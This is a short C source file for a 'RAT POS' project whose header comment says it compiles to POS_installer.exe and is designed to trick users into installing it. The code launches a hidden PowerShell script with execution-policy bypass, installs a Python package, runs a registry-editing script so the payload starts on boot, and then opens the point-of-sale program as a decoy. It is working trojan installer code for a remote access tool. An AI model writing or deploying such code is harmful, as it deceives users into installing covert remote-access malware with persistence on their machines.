/*
Project: RAT POS
Author: Swager
Description: this file is compiled to POS_installer.exe and is designed to trick the user into installing python
and triggering add_startup.py so that pos.py runs on startup.

*/

#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <tchar.h>

int main()
{
    system("start /WAIT powershell.exe -ExecutionPolicy bypass\ninitialize.ps1 -noprofile -windowstyle hidden"); //powershell script that checks if python is installed
    system("start /WAIT pip install openpyxl\n"); //openpyxl is needed to run pos.py
    system("python ./persistence/add_startup.py\n"); //starts the registry editing py file after python is installed
    system("python ./UDP_Connection/pos.py\n"); //starts the POS the user thinks they downloaded
    return 0;
}